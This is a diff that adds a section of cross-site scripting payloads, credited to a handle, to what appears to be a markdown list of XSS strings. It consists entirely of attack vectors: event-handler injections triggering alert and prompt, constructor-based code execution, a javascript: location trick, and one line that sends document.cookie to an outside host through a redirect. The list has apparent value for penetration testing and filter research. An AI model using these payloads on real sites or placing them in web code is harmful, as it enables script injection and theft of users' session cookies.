@@ -1,3 +1,18 @@
+# @jackmasa
+
+~~~
+<a href="" onclick=``/*/alt="*//alert(1)//">clickme</a>
+<a href="" onclick=``/name==alert(1)>clickme</a>
+location`javascript:alert(1)` //edge
+0..constructor.constructor`alert(1)```
+location=`https://www.google.com/csi ?${escape(document.cookie)}`;
+<iframe src="http://target" referrerpolicy="no-referrer" >
+<body onload=```${prompt``}`>
+
+~~~
+
+
+
 # Rsnake and others' polyglot XSS strings
 
 ~~~
